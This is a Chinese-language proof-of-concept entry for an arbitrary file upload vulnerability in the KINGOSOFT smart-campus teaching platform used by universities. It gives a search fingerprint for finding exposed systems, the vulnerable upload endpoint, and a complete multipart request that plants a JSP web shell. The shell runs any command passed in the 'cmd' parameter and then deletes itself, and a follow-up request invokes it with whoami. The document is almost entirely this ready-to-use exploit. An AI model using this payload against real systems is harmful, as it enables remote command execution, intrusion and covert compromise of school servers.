# KINGOSOFT高校智慧校园教学综合服务平台uploadfile任意文件上传漏洞

- **系统**：KINGOSOFT　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="KINGOSOFT高校智慧校园教学综合服务平台"`
- **请求**：`POST /kyfw/frame/sbxm.sbxm.uploadfile.jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vB…`

**请求体 / payload**
```
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: text/plain
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryKNt0t4vBe8cX9rZk--GET /source/uploadfile/1760674387210.jsp?cmd=whoami HTTP/1.1
Host:
```
- **预期**：200　|　—